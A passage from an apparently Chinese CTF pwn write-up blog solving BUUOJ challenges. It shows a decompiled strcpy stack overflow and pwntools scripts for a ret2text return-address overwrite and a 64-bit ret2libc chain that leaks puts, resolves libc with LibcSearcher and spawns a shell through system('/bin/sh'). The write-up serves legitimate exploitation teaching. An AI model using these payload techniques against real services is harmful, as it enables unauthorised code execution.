+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata); <span class="hljs-comment">//读入32个字符 fgets很安全</span><br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3); <span class="hljs-comment">//会把我们输入的I变成you</span><br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4);<br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0); <span class="hljs-comment">//v0是将I变成you后的字符串，长度会很长，造成s的栈溢出从而ret2text</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>这道题里用的读入函数是fgets，按理来说是很安全的。但是题目中的逻辑会把字符串中的I变成you，从而将字符串长度变长，再加上strcpy函数的作妖，使得32个字节的s栈溢出。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25003</span>)<br>payload = flat(&#123;<span class="hljs-number">1</span>:  <span class="hljs-string">&quot;I&quot;</span> * <span class="hljs-number">21</span>, <span class="hljs-number">22</span>: p32(<span class="hljs-number">0x08048F0D</span>) &#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="6jarvisoj_level0"><a class="markdownIt-Anchor" href="#6jarvisoj_level0"></a> 6.jarvisoj_level0</h3>
+<p>和 <a href="https://wuuconix.link/2022/01/30/pwn/#2level0">攻防世界#2level0</a>重复。最简单的ret2text，不多说。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29484</span>)<br>sys_addr = <span class="hljs-number">0x0400596</span><br>payload = flat(&#123; <span class="hljs-number">0x80</span> + <span class="hljs-number">8</span> : p64(sys_addr)&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<h3 id="7ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#7ciscn_2019_c_1"></a> 7.ciscn_2019_c_1</h3>
+<p>此题和<a href="https://wuuconix.link/2022/01/30/pwn/#10level3">攻防世界 #10level3</a> 一样，属于ret2libc。IDA中没有发现system，也没有/bin/sh字符串。</p>
+<p>比level3还更难，因为level3直接提供了libc库文件，这道题里没有，我们需要利用LibcSearcher这个库来查找libc版本号。</p>
+<blockquote>
+<p>这里我使用了 <a target="_blank" rel="noopener" href="https://github.com/rycbar77/LibcSearcher">rycbar77/LibcSearcher: 根据函数地址查询libc，可本地或在线查询 (github.com)</a> 维护的LibcSearcher，支持本地和在线查询，作者的安装教程也写的很详细。</p>
+</blockquote>
+<p>程序中大量使用了puts函数来进行输出，一旦puts函数被使用，got表中就会存储其真实地址，于是我们再调用puts函数本身，把自己输出出来，作为查询libc版本的依据。</p>
+<p>值得注意的是，由于本地是64位的linux，构造payload传递参数的时候，和32位不同。差别如下。</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#32</span>位<br><span class="hljs-selector-tag">elf</span><span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;puts&#x27;</span>]</span>, 返回地址, 参数地址<br><span class="hljs-selector-id">#64</span>位 需要利用<span class="hljs-selector-tag">rdi</span>寄存器存储参数<br><span class="hljs-selector-tag">pop_rdi_addr</span>, 参数地址， <span class="hljs-selector-tag">elf</span><span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;puts&#x27;</span>]</span>, 返回地址<br></code></pre></td></tr></table></figure>
+<p>其中pop_rdi_addr 可以用 <code>ROPgadget --binary ciscn_2019_c_1 | grep &quot;pop rdi&quot;</code>获得。</p>
+<p>在获得puts函数的真实地址后，我们利用LibcSearcher查询libc版本，确定版本后，便可以根据两个函数<strong>真实地址</strong>的差和两个函数<strong>形式地址</strong>的差是相等的这个规律，获得system和/bin/sh的地址。</p>
+<p>最后按照64位调用函数的格式调用即可。</p>
+<p>这道题最后调用的时候还需要栈对齐，这玩意儿我还不太会，但是其格式就是在pop_rdi_addr前面加上ret的地址，先记住吧。</p>
+<div class='spoiler collapsed'>
+    <div class='spoiler-title'>
+        payload代码
+    </div>
+    <div class='spoiler-content'>
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27340</span>)<br>ciscn = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your choice!&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>pop_rdi_addr = <span class="hljs-number">0x00400c83</span><br>payload1 = flat(&#123;<span class="hljs-number">0</span>: <span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>: [p64(pop_rdi_addr), p64(ciscn.got[<span class="hljs-string">&#x27;puts&#x27;</span>]), p64(ciscn.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]), p64(ciscn.symbols[<span class="hljs-string">&#x27;main&#x27;</span>])]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>, payload1)<br>sh.recvuntil(<span class="hljs-string">&quot;Ciphertext\n\n&quot;</span>)<br>puts_addr = u64(sh.recvline()[<span class="hljs-number">0</span>: -<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\0&quot;</span>)) <span class="hljs-comment">#puts函数真实地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>sys_addr = puts_addr + libc.dump(<span class="hljs-string">&quot;system&quot;</span>) - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>str_bin_sh_addr = puts_addr + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>ret_addr = <span class="hljs-number">0x004006b9</span> <span class="hljs-comment">#用ROPgadget获得ret的地址，用来栈对齐</span><br>payload2 = flat(&#123;<span class="hljs-number">0</span>: <span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>: [p64(ret_addr), p64(pop_rdi_addr), p64(str_bin_sh_addr), p64(sys_addr)]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your choice!&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+    </div>
+</div>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/writeup/">#writeup</a>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PWN PWN PWN！</div>
+      <div>https://wuuconix.link/2022/01/30/pwn/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>wuuconix</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年1月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/02/18/ipv6/" title="天降公网ip">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">天降公网ip</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/01/29/acme-sh/" title="利用acme.sh快速获取SSL证书">
+                        <span class="hidden-mobile">利用acme.sh快速获取SSL证书</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.16/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"tHbt1wElFiuw8zrDBIEUsNIv-gzGzoHsz","appKey":"ztzeLh1CDeUvYk1YrI8bK8kW","path":"window.location.pathname","placeholder":"留下一条友善的评论吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.13.10/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('mermaid' in window) {
+        mermaid.init();
+      }
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><br> <span>本网站由 <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank""><img src="https://upyun.wuuconix.link/upyun.png" srcset="/img/loading.gif" lazyload width="53" height="18" style="fill: currentColor;"/></a> 提供 CDN 加速/云存储服务</span> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      浙ICP备2021025197号-1
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33048202000536"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>浙公网安备33048202000536号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+<script src="//paste.vaala.cloud/raw/siqopubiwi.js"></script>
+<script src="/js/APlayer.min.js"></script>
+<script src="//url.wuuconix.link/live2d.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
